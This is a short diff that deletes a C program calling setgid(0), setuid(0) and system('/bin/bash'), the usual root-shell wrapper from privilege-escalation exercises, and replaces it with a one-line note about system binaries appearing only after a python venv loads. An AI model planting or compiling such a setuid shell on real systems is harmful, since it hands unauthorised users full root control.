@@ -1,10 +1,1 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-int main() {
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
-    return 0;
-}
+So one of my findings is that the system binaries can only be found once the python venv is loaded
